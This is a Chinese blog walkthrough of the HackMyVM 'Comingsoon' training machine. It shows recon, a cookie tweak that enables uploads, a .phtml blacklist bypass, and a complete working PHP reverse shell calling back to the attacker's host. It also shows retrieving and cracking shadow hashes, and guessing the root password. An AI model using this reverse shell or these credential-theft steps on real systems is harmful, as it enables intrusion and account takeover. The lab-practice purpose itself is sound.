> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ieEP-LX89WF1xF2P1GsyNQ)

 ![](http://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsGamtQXiblwiaPhT11gUfcWibGaGzbdzpL0N1UGmGdGP78y7DW7sCUOicTibjbBZHrHewj9uP2Tx3yPiaw/0?wx_fmt=png) ** 伏波路上学安全 ** 专注于渗透测试、代码审计等安全技术，分享安全知识. 46篇原创内容   公众号

![图片](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtquPKt0BQj9Quu3bEYw08E3UUpNIm04S5nBEdFxZPPdvEcUfdG7afqZU35oy7iaWJxVcPyb1hbAUQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)  

靶机信息
----

下载地址:

```
https://hackmyvm.eu/machines/machine.php?vm=Comingsoon  
链接：https://pan.baidu.com/s/1Q0dm5yVMeMY9n5wUFWsQJA?pwd=iv8k   
提取码：iv8k
```

靶场: HackMyVm.eu

靶机名称: Comingsoon

难度: 简单

发布时间: 2021年12月17日

提示信息:

```
无
```

目标: 2个flag

  

实验环境
----

```
攻击机:VMware kali 192.168.7.3  
  
靶机:Vbox linux IP自动获取
```

  

信息收集
----

### 扫描主机

扫描局域网内的靶机IP地址

```
sudo nmap -sP 192.168.7.1/24
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

扫描到主机地址为192.168.7.213

### 扫描端口

扫描靶机开放的服务端口

```
sudo nmap -sC -sV -p- 192.168.7.213 -oN comingsoon.nmap
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

扫描到2个开放端口

```
22:SSH  
80:HTTP
```

Web渗透
-----

访问80端口

```
http://192.168.7.213
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

打开后是一个倒计时页面，未找到提示信息。用目录扫描找一下敏感文件

```
gobuster dir -w ../../Dict/SecLists-2021.4/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.7.213 -x php,html,txt,zip
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

扫描完成，先看一下notes.txt内容

```
curl http://192.168.7.213/notes.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

提示的内容很多，整理一下

```
1。dave可能是用户名  
2。ssh需要使用key登录  
3。需要调整一下图片，大小和scp或者使用内置的图像上传器  
4。有未删除的敏感文件  
5。需要https证书
```

再来看一下license.txt

```
curl http://192.168.7.213/license.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

提示这是bolt程序，其他目录没什么有用信息，再来看看首页

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

cookie这里发些base64编码后的内容，解一下看看是什么

```
https://base64.us/
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

解码后是开启上传的选项，值是false，将他改为true试试

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

将编码后的内容放到cookie中提交，多次尝试后发现这个cookie是分两段的（这里用hackbarv2)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### 文件上传黑名单绕过

执行后在页面上出现了上传按钮，上传个反弹shell文件试试

反弹shell代码

```
`<?php``set_time_limit (0);``$VERSION = "1.0";``$ip = '192.168.7.3'; // CHANGE THIS``$port = 4444;       // CHANGE THIS``$chunk_size = 1400;``$write_a = null;``$error_a = null;``$shell = 'uname -a; w; id; /bin/bash -i';``$daemon = 0;``$debug = 0;``//``// Daemonise ourself if possible to avoid zombies later``//``// pcntl_fork is hardly ever available, but will allow us to daemonise``// our php process and avoid zombies. Worth a try...``if (function_exists('pcntl_fork')) {``// Fork and have the parent process exit``$pid = pcntl_fork();``if ($pid == -1) {``printit("ERROR: Can't fork");``exit(1);``}``if ($pid) {``exit(0); // Parent exits``}``// Make the current process a session leader``// Will only succeed if we forked``if (posix_setsid() == -1) {``printit("Error: Can't setsid()");``exit(1);``}``$daemon = 1;``} else {``printit("WARNING: Failed to daemonise. This is quite common and not fatal.");``}``// Change to a safe directory``chdir("/");``// Remove any umask we inherited``umask(0);``//``// Do the reverse shell...``//``// Open reverse connection``$sock = fsockopen($ip, $port, $errno, $errstr, 30);``if (!$sock) {``printit("$errstr ($errno)");``exit(1);``}``// Spawn shell process``$descriptorspec = array(` `0 => array("pipe", "r"), // stdin is a pipe that the child will read from` `1 => array("pipe", "w"), // stdout is a pipe that the child will write to` `2 => array("pipe", "w")   // stderr is a pipe that the child will write to``);``$process = proc_open($shell, $descriptorspec, $pipes);``if (!is_resource($process)) {``printit("ERROR: Can't spawn shell");``exit(1);``}``// Set everything to non-blocking``// Reason: Occsionally reads will block, even though stream_select tells us they won't``stream_set_blocking($pipes[0], 0);``stream_set_blocking($pipes[1], 0);``stream_set_blocking($pipes[2], 0);``stream_set_blocking($sock, 0);``printit("Successfully opened reverse shell to $ip:$port");``while (1) {``// Check for end of TCP connection``if (feof($sock)) {``printit("ERROR: Shell connection terminated");``break;``}``// Check for end of STDOUT``if (feof($pipes[1])) {``printit("ERROR: Shell process terminated");``break;``}``// Wait until a command is end down $sock, or some``// command output is available on STDOUT or STDERR``$read_a = array($sock, $pipes[1], $pipes[2]);``$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);``// If we can read from the TCP socket, send``// data to process's STDIN``if (in_array($sock, $read_a)) {``if ($debug) printit("SOCK READ");``$input = fread($sock, $chunk_size);``if ($debug) printit("SOCK: $input");``fwrite($pipes[0], $input);``}``// If we can read from the process's STDOUT``// send data down tcp connection``if (in_array($pipes[1], $read_a)) {``if ($debug) printit("STDOUT READ");``$input = fread($pipes[1], $chunk_size);``if ($debug) printit("STDOUT: $input");``fwrite($sock, $input);``}``// If we can read from the process's STDERR``// send data down tcp connection``if (in_array($pipes[2], $read_a)) {``if ($debug) printit("STDERR READ");``$input = fread($pipes[2], $chunk_size);``if ($debug) printit("STDERR: $input");``fwrite($sock, $input);``}``}``fclose($sock);``fclose($pipes[0]);``fclose($pipes[1]);``fclose($pipes[2]);``proc_close($process);``// Like print, but does nothing if we've daemonised ourself``// (I can't figure out how to redirect STDOUT like a proper daemon)``function printit ($string) {``if (!$daemon) {``print "$string\n";``}``}``?>`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

点击上传后提示.php文件不能上传，我们改下包试试

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

经过测试phtml可以上传并解析，并且在assets/img目录下找到上传文件

### 反弹Shell

1。kali攻击机监听4444端口

```
nc -lvvp 4444
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

2。访问shell.phtml反弹shell

```
http://192.168.7.213/assets/img/shell.phtml
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

反弹成功，先切换到交互式shell

```
`python3 -c 'import pty;pty.spawn("/bin/bash")'``export TERM=xterm``Ctrl+z快捷键``stty raw -echo;fg``reset`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

切换完成来找找敏感信息

```
cat /etc/passwd
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

发现scpuser用户可以登录，继续找

```
cd /var/backups  
ls -al
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

/var/backups目录下发现backup.tar.gz文件，解压看看内容

```
cp backup.tar.gz /tmp  
cd tmp  
tar -zxvf backup.tar.gx
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

解压完，查看下里面有什么文件

```
ls -al  
cd /etc  
ls -al
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

发现passwd和shadow文件，下载下来暴破密码

1。靶机开启HTTP服务

```
python3 -m http.server
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

2。kali攻击机下载2个文件

```
wget http://192.168.7.213:8000/passwd  
wget http://192.168.7.213:8000/shadow
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

下载完成，使用unshadow合并两个文件

```
unshadow passwd shadow >pass
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

合并后使用john暴破密码

```
john --wordlist=/usr/share/wordlists/rockyou.txt pass --format=crypt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

拿到scpuser的密码，SSH登录验证下

```
ssh scpuser@192.168.7.213
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

需要证书才可以登录 ，那就直接在靶机上切换scpuser用户

```
su scpuser
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

切换到scpuser用户了，找flag

```
cd /home/scpuser
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

拿到user.txt，找一下如何提权

```
ls -al  
cat .oldpasswords
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

拿到4个密码，猜测是root密码。切换试试

```
su root
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

密码全部是错误的，一天过去了还是没找到提权方法。于是找了网上其他人的wirteup，发现密码是带有数字的动画电影名字，可以参考

```
https://www.rottentomatoes.com/top/bestofrt/top_100_animation_movies/
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

最佳100部动画电影的名字，还好只需要带有数字的动画电影，我整理了一下

```
ToyStory4  
ToyStory3  
ToyStory2  
HowtoTrainYourDragon2  
TheLEGOMovie2TheSecondPart  
Shrek2
```

来验证一下密码

```
su root
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

拿到root权限，找一下flag

```
cd /root  
ls  
cat root.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

拿到root.txt，游戏结束

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

END

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**这篇文章到这里就结束了,喜欢打靶的小伙伴可以关注"伏波路上学安全"微信公众号,或扫描下面二维码关注,我会持续更新打靶文章,让我们一起在打靶中学习进步吧.**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)